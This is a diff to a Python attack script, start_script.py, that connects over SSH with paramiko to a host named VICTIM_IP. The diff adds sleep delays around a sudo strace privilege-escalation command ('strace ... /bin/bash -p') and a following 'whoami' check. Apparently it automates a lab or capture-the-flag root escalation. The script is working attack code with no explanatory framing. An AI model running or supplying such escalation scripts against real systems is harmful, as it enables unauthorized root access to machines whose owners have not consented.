@@ -1,5 +1,5 @@
 # start_script.py
-import subprocess, paramiko, config
+import subprocess, paramiko, config, time
 
 hostname = config.VICTIM_IP
 port = 22
@@ -48,9 +48,13 @@ try:
     print(stdout.read().decode())
     print(stderr.read().decode())
     
+    time.sleep(3)
+    
     stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p")
     print(stdout.read().decode())
     print(stderr.read().decode())
+    
+    time.sleep(5)
     
     stdin, stdout, stderr = client.exec_command("whoami")
     print(stdout.read().decode())
